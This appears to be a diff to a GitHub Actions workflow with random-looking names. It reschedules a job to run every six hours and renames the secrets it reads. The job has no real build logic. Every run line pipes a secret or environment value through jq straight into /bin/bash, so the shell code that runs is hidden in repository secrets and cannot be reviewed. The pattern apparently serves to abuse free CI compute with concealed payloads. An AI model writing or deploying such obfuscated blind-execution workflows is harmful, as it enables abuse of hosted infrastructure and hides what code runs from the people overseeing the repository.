@@ -3,22 +3,22 @@ name: corsetgoofy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 3/6 * * *'
-jobs:  # 27
+    - cron: '32 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: corsetgoofy
         env:
-          bj71339: ${{ secrets.bj71339 }}
+          rmmvk18: ${{ secrets.rmmvk18 }}
         run: |
-          echo $bj71339 | jq -r .w704 | /bin/bash
-          echo $ueyn94323 | jq -r .rto6713 | /bin/bash
-          echo $a89 | jq -r .bsu150 | /bin/bash
-          echo $i720 | jq -r .g725 | /bin/bash
-          echo $wqqo4 | jq -r .tzrc25 | /bin/bash
-          echo $umnu27 | jq -r .g052 | /bin/bash
-          echo $k9347 | jq -r .xwh6 | /bin/bash
+          echo $rmmvk18 | jq -r .f645 | /bin/bash
+          echo $ifbi160 | jq -r .xwq80048 | /bin/bash
+          echo $hmeqy3814 | jq -r .no16041 | /bin/bash
+          echo $d3445 | jq -r .vyd1 | /bin/bash
+          echo $le49 | jq -r .rxnlo62138 | /bin/bash
+          echo $jt42881 | jq -r .wgo9 | /bin/bash
+          echo $vspuu35 | jq -r .esa84 | /bin/bash
 
